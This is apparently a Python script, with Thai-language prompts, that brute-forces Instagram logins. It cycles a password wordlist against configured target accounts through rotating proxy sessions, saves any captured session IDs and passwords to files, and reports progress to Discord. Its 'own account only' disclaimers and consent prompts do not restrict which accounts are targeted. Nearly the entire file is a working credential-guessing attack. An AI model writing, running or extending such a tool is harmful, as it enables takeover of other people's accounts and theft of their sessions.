#!/usr/bin/env python3
"""
🚀 Real Instagram Brute Force with ALX Trading Passwords
การทดสอบจริงกับ account ของตัวเอง (ETHICAL TESTING ONLY)
"""

import json
import time
from datetime import datetime
from brute_force import InstagramBruteForce
from webhook.discord_notify import send_discord_alert

def run_real_brute_force():
    """เริ่มการ brute force จริง - ใช้เฉพาะกับ account ของตัวเอง"""
    
    print("🚨 ETHICAL BRUTE FORCE TESTING")
    print("⚠️  WARNING: Use only with accounts you own!")
    print("=" * 60)
    
    # Ethical consent check
    print("📋 Ethical Guidelines:")
    print("   1. ใช้เฉพาะกับ account ของตัวเองเท่านั้น")
    print("   2. ไม่ใช้กับ account ของผู้อื่น")
    print("   3. ปฏิบัติตามกฎหมายและข้อกำหนดของ Instagram")
    print("   4. รับผิดชอบผลที่เกิดขึ้นด้วยตัวเอง")
    print()
    
    consent = input("✅ คุณยืนยันว่าจะใช้เฉพาะกับ account ของตัวเอง? (yes/no): ")
    if consent.lower() not in ['yes', 'y']:
        print("❌ การทดสอบถูกยกเลิก - ไม่ได้รับความยินยอม")
        return
    
    # Load configuration
    print("\n🔧 Loading configuration...")
    brute_force = InstagramBruteForce("brute_config.json")
    
    # Show current targets
    with open('brute_config.json', 'r') as f:
        config = json.load(f)
    
    print("\n🎯 Configured Targets:")
    for i, target in enumerate(config['targets'], 1):
        print(f"   {i}. {target['identifier']} ({target['type']})")
        if 'preferred_wordlist' in target:
            print(f"      → Wordlist: {target['preferred_wordlist']}")
    
    # Select target
    while True:
        try:
            target_choice = input(f"\n🎯 เลือก target (1-{len(config['targets'])}): ")
            target_index = int(target_choice) - 1
            if 0 <= target_index < len(config['targets']):
                selected_target = config['targets'][target_index]
                break
            else:
                print("❌ เลือกหมายเลขที่ถูกต้อง")
        except ValueError:
            print("❌ กรุณาใส่หมายเลข")
    
    print(f"\n✅ Selected target: {selected_target['identifier']}")
    
    # Load preferred wordlist
    wordlist_file = selected_target.get('preferred_wordlist', 'common_passwords.txt')
    print(f"📋 Loading wordlist: {wordlist_file}")
    
    try:
        with open(wordlist_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"✅ Loaded {len(passwords)} passwords")
    except FileNotFoundError:
        print(f"❌ Wordlist file not found: {wordlist_file}")
        return
    
    # Final confirmation
    print(f"\n⚠️  FINAL WARNING:")
    print(f"   Target: {selected_target['identifier']}")
    print(f"   Passwords to test: {len(passwords)}")
    print(f"   Rate limit: {config['request_delay']} seconds between attempts")
    print(f"   Max attempts: {config['max_attempts']}")
    print()
    
    final_consent = input("🚨 คุณแน่ใจหรือไม่ที่จะเริ่มการทดสอบ? (YES/no): ")
    if final_consent != 'YES':
        print("❌ การทดสอบถูกยกเลิก")
        return
    
    # Send Discord notification about start
    try:
        start_message = f"🚀 **BRUTE FORCE STARTED**\n"
        start_message += f"**Target:** {selected_target['identifier']}\n"
        start_message += f"**Wordlist:** {wordlist_file}\n"
        start_message += f"**Passwords:** {len(passwords)}\n"
        start_message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        send_discord_alert(start_message)
    except Exception as e:
        print(f"⚠️ Failed to send Discord notification: {e}")
    
    # Start brute force
    print("\n🚀 Starting brute force attack...")
    print("🔄 Press Ctrl+C to stop at any time")
    print("-" * 60)
    
    start_time = datetime.now()
    successful_logins = []
    failed_attempts = 0
    
    try:
        for i, password in enumerate(passwords[:config['max_attempts']], 1):
            print(f"🔍 Attempt {i}/{min(len(passwords), config['max_attempts'])}: {selected_target['identifier']} | {password}")
            
            # Actual login attempt
            session = brute_force.proxy_manager.get_session()
            success, result = brute_force.attempt_login(
                selected_target['identifier'], 
                password, 
                session
            )
            
            if success:
                successful_logins.append(result)
                print(f"🎉 SUCCESS! Session found: {result['session_id'][:20]}...")
                
                # Save session immediately
                session_file = f"session_{selected_target['identifier'].replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(session_file, 'w') as f:
                    json.dump(result, f, indent=2)
                print(f"💾 Session saved to: {session_file}")
                
                # Ask if continue or stop
                continue_choice = input("\n🤔 Found a session! Continue testing? (yes/no): ")
                if continue_choice.lower() not in ['yes', 'y']:
                    break
            else:
                failed_attempts += 1
                print(f"❌ Failed: {result.get('error', 'Unknown error')}")
            
            # Rate limiting
            print(f"⏳ Waiting {config['request_delay']} seconds...")
            time.sleep(config['request_delay'])
    
    except KeyboardInterrupt:
        print("\n⏹️ Brute force stopped by user")
    
    except Exception as e:
        print(f"\n❌ Error during brute force: {e}")
    
    # Results summary
    end_time = datetime.now()
    duration = end_time - start_time
    
    print("\n" + "=" * 60)
    print("📊 BRUTE FORCE RESULTS")
    print("=" * 60)
    print(f"🎯 Target: {selected_target['identifier']}")
    print(f"🔑 Passwords tested: {failed_attempts + len(successful_logins)}")
    print(f"✅ Successful logins: {len(successful_logins)}")
    print(f"❌ Failed attempts: {failed_attempts}")
    print(f"⏱️ Duration: {duration}")
    print(f"📅 Completed: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    if successful_logins:
        print("\n🎉 SUCCESSFUL SESSIONS:")
        for session in successful_logins:
            print(f"   🔑 Password: {session['password']}")
            print(f"   📱 Session ID: {session['session_id'][:20]}...")
            print(f"   👤 User ID: {session.get('user_id', 'Unknown')}")
    
    # Save final results
    final_results = {
        'target': selected_target['identifier'],
        'wordlist_used': wordlist_file,
        'passwords_tested': failed_attempts + len(successful_logins),
        'successful_logins': successful_logins,
        'failed_attempts': failed_attempts,
        'start_time': start_time.isoformat(),
        'end_time': end_time.isoformat(),
        'duration_seconds': duration.total_seconds(),
        'ethical_consent': True
    }
    
    results_file = f"brute_results_{selected_target['identifier'].replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(results_file, 'w') as f:
        json.dump(final_results, f, indent=2, ensure_ascii=False)
    
    print(f"\n💾 Final results saved to: {results_file}")
    
    # Send completion notification
    try:
        completion_message = f"🏁 **BRUTE FORCE COMPLETED**\n"
        completion_message += f"**Target:** {selected_target['identifier']}\n"
        completion_message += f"**Success:** {len(successful_logins)} sessions found\n"
        completion_message += f"**Duration:** {duration}\n"
        completion_message += f"**Time:** {end_time.strftime('%Y-%m-%d %H:%M:%S')}"
        send_discord_alert(completion_message)
    except Exception as e:
        print(f"⚠️ Failed to send completion notification: {e}")

if __name__ == "__main__":
    print("🎯 Instagram Brute Force - ALX Trading Edition")
    print("ใช้ password list alx_trading_passwords.txt")
    print("⚠️  ETHICAL TESTING ONLY - ใช้กับ account ของตัวเองเท่านั้น")
    
    run_real_brute_force()
